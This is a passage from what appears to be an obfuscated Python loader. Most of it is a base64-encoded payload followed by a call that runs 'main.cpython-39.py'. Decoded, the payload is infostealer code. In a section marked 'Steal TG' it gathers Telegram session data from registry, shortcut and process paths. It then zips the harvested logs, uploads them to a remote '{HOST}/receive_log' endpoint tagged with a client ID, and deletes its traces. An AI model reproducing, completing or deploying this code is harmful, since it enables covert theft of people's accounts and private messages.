Jvb3RfcGF0aHMsIHNlYXJjaF9mb2xkZXJfbmFtZXMsIGxvZ2dlcikpKQogICAgCiAgICAgICAgb3RoZXJfcGx1Z2lucyA9IFtEZXRhaWxzKGNvbmYpXQogICAgCiAgICAgICAgZm9yIHBsdWdpbiBpbiBvdGhlcl9wbHVnaW5zOgogICAgICAgICAgICB0YXNrcy5hcHBlbmQoY3JlYXRlX3Rhc2socGx1Z2luLmNhbGxiYWNrKCkpKQogICAgCiAgICAgICAgZm9yIHRhc2sgaW4gdGFza3M6CiAgICAgICAgICAgIHRhc2suYWRkX2RvbmVfY2FsbGJhY2sobGFtYmRhIHg6IF9oYW5kbGVfdGFza19yZXN1bHQoeCwgbG9nZ2VyKSkKICAgIAogICAgICAgICMgU3RlYWwgVEcKICAgICAgICB0cnk6CiAgICAgICAgICAgIHRnX3BhdGggPSBUZWxlZ3JhbS5nZXRfcmVnaXN0cnlfcGF0aCgpCiAgICAgICAgICAgIGF3YWl0IHRlbGVncmFtLmNhbGxiYWNrKHRnX3BhdGgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbSByZWdpc3RyeSwge2V9JykKICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgdGdfcGF0aDIgPSBUZWxlZ3JhbS5nZXRfbG5rX3BhdGgoKQogICAgICAgICAgICBpZiB0Z19wYXRoMjoKICAgICAgICAgICAgICAgIGF3YWl0IHRlbGVncmFtLmNhbGxiYWNrKHRnX3BhdGgpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbSBsbmssIHtlfScpCiAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciB0Z19wYXRoXyBpbiBUZWxlZ3JhbS5nZXRfdGVsZWdyYW1zKCk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgdGVsZWdyYW0uY2FsbGJhY2sodGdfcGF0aF8pCiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgbG9nZ2VyLmxvZyhmJ1RlbGVncmFtIGZyb20gcHN1dGlsIGVycm9yLCB7ZX0nKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgYXdhaXQgbG9nZ2VyLmxvZyhmJ0Vycm9yIHdoZW4gc3RlYWxpbmcgdGVsZWdyYW1zIHByb2MsIHtlfScpCiAgICAgICAgIyBFbmQgVEcKICAgIAogICAgICAgIGZvciB0YXNrIGluIHRhc2tzOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhd2FpdCB0YXNrCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIGF3YWl0IGxvZ2dlci5sb2coZidFcnJvciBpbiBtYWluLnB5IHRhc2tzIHtlfScpCiAgICAgICAgCiAgICAgICAgYXdhaXQgbG9nZ2VyLmxvZyhmJ9Cd0LDRh9C40L3QsNGOINC+0YLQv9GA0LDQstC60YMg0LvQvtCz0LAnKQogICAgCiAgICAgICAgemlwX2xvZ19wYXRoID0gam9pbihURU1QLCBmJ3tjbGllbnRfaWR9LnppcCcpCiAgICAgICAgd2l0aCBaaXBGaWxlKHppcF9sb2dfcGF0aCwgJ3cnLCBaSVBfREVGTEFURUQpIGFzIHppcGY6CiAgICAgICAgICAgIHppcGRpcihsb2dfcGF0aCwgemlwZikKICAgIAogICAgICAgIGZpbGVzID0geydmaWxlJzogb3Blbih6aXBfbG9nX3BhdGgsICdyYicpfQogICAgICAgICAgICAKICAgICAgICBhd2FpdCBzZXNzaW9uLnBvc3QoZid7SE9TVH0vcmVjZWl2ZV9sb2cnLCBwYXJhbXM9eydjbGllbnRfaWQnOiBjbGllbnRfaWR9LCBkYXRhPWZpbGVzKQogICAgICAgIGF3YWl0IHNlc3Npb24uY2xvc2UoKQogICAgCiAgICAgICAgc3RvcCA9IHRpbWVpdC5kZWZhdWx0X3RpbWVyKCkKICAgICAgICBhd2FpdCBsb2dnZXIubG9nKGYnVGltZToge3N0b3Atc3RhcnR9JykKICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgJ0RFQlVHJyBub3QgaW4ge2kubmFtZSBmb3IgaSBpbiBzY2FuZGlyKGpvaW4oVEVNUCwgJ19fcHljYWNoZV9fJykpfToKICAgICAgICAgICAgICAgIGZyb20gc2h1dGlsIGltcG9ydCBybXRyZWUKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBybXRyZWUoam9pbihURU1QLCAnX19weWNhY2hlX18nKSkKICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBybXRyZWUobG9nX3BhdGgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAKICAgIGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKS5ydW5fdW50aWxfY29tcGxldGUobWFpbigpKQ=='))

run('main.cpython-39.py')

